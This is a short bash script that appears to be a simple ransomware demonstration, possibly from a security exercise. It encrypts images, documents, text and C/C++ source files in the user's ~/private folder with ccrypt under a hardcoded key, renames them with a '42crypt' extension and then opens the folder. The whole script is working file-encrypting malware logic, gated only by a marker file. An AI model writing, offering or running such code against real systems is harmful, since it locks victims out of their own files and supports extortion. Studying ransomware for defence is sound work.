#!/bin/bash
KEY=cybersec42
FOLDER="${HOME}"/private

# Security check: if the file .quierollorar doesn't exist, exit.
if [ ! -e "${FOLDER}"/.quierollorar ]; then
	exit
fi

# Find all files with specific extension
FILES=$(find "${FOLDER}" -regextype posix-egrep -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt|c|cpp)")
for file in $FILES; do
	# echo -n encrypting $file
	ccrypt -se "${file}" -S 42crypt -K $KEY
done

FILES=$(find $FOLDER -type f)
for file in $FILES; do
	sleep 0.1
	echo $file
	filename=$(echo $file | sed s/cpt/42crypt/g )
	mv $file $filename
	if [ !  "$filename" == ".quierollorar" ];then
		echo -n $filename encrypted.
	fi
done
open $FOLDER
